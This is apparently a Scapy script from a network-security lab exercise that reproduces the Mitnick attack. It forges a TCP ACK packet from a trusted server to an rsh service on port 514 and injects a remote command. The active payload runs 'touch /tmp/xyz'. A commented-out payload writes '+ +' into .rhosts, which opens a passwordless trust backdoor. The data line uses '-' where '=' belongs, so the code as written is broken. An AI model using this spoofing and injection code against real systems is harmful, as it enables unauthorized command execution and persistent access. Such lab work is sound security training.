from scapy.all import *

srv_ip = "10.9.0.6"
x_ip = "10.9.0.5"

ip = IP(src=srv_ip, dst=x_ip)

tcp = TCP(sport=1023, dport=514, flags="A", seq=778933536, ack=1915343163)

if tcp.flags == "A":
    print("Establishing ACK Packets.....")

data - "9090\x00seed\x00dees\x00touch /tmp/xyz\x00"

# data = "9090\x00seed\x00dees\x00echo + + > .rhosts\x00"

pkt = ip/tcp/data
send(pkt, verbose=0)